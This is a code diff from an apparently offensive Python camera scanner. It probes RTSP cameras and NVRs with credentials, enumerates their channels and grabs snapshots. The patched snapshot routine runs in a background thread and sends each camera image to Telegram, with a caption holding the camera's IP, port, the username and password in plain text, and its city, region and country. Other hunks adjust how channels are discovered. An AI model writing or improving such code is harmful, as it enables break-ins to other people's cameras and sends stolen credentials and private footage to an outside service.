@@ -11412,22 +11412,28 @@ def run_rtsp_file_scan(input_files=None):
             except Exception:
                 pass
 
-            # ── Snapshot capture + Telegram photo ────────────────────────────
+            # ── Snapshot capture + Telegram photo (fire-and-forget) ──────────
+            # Run in a daemon thread — fetch_camera_snapshot tries up to
+            # 18 HTTP requests (9 endpoints × 2 auth) at 5s each = 90s/camera.
+            # Blocking the main loop here was causing the "stuck after split" bug.
             if TELEGRAM_CONFIG.get("enabled"):
-                try:
-                    snapshot = fetch_camera_snapshot(ip, port, user, pw, ctype)
-                    if snapshot:
-                        snap_caption = (
-                            f"📸 RTSP Scan Snapshot\n"
-                            f"📷 {ctype}\n"
-                            f"🌐 {ip}:{port}\n"
-                            f"👤 {user} | 🔑 {pw}\n"
-                            f"📍 {city}, {region}, {country}\n"
-                            f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-                        )
-                        send_telegram_photo(snapshot, snap_caption)
-                except Exception:
-                    pass
+                def _snap_bg(_ip=ip, _port=port, _u=user, _pw=pw,
+                             _ct=ctype, _city=city, _reg=region, _co=country):
+                    try:
+                        _snap = fetch_camera_snapshot(_ip, _port, _u, _pw, _ct)
+                        if _snap:
+                            _cap = (
+                                f"📸 RTSP Scan Snapshot\n"
+                                f"📷 {_ct}\n"
+                                f"🌐 {_ip}:{_port}\n"
+                                f"👤 {_u} | 🔑 {_pw}\n"
+                                f"📍 {_city}, {_reg}, {_co}\n"
+                                f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+                            )
+                            send_telegram_photo(_snap, _cap)
+                    except Exception:
+                        pass
+                threading.Thread(target=_snap_bg, daemon=True).start()
 
             # ── Telegram 5-minute progress update ────────────────────────────
             _rtsp_now = time.time()
@@ -12115,16 +12121,23 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
                 '/cam/realmonitor?channel={n}&subtype=0',
                 '/h264/ch{n}/main/av_stream',
             ]
-        _supp_added = 0
-        _supp_miss  = 0   # consecutive channels with no valid response
-        for _sn in range(1, 33):
+        # Adaptive ceiling: probe up to (highest API-reported channel + 4),
+        # minimum 8.  This avoids scanning 32 slots on a 4-ch NVR while still
+        # discovering any extra channels on a 64-ch NVR (ceiling = 68).
+        _api_max_ch   = max((c['num'] for c in _channels
+                             if not c.get('zero_ch') and c['num'] > 0),
+                            default=0)
+        _supp_limit   = max(_api_max_ch + 4, 8)
+        _supp_added   = 0
+        _supp_miss    = 0   # consecutive channels with no valid response
+        for _sn in range(1, _supp_limit + 1):
             if len(_channels) >= _max_ch:
                 break
             if _sn in _supp_existing:
                 _supp_miss = 0
                 continue
-            if _supp_miss >= 4:
-                break   # 4 consecutive empty slots → stop probing
+            if _supp_miss >= 3:
+                break   # 3 consecutive empty slots → no more channels
             _found_ch = False
             for _stpl in _supp_tpls:
                 if _found_ch:
@@ -12140,7 +12153,10 @@ def run_nvr_split(nvr_ip, nvr_port, nvr_user, nvr_pass, silent=False,
                                  f"User-Agent: SMVScanner\r\n\r\n").encode())
                     _sresp = _ss.recv(128).decode('utf-8', errors='replace')
                     _ss.close()
-                    if ' 200 ' in _sresp or ' 401 ' in _sresp:
+                    # Only accept 200 OK — 401 means the URL format is
+                    # valid but does NOT confirm the channel exists (many
+                    # Dahua/generic NVRs return 401 for any channel number).
+                    if ' 200 ' in _sresp:
                         _snap_url = (
                             f"http://{nvr_ip}:{nvr_port}/ISAPI/Streaming/channels/{_sn}01/picture"
                             if ('hikvision' in _src_lc or 'hik' in _src_lc)
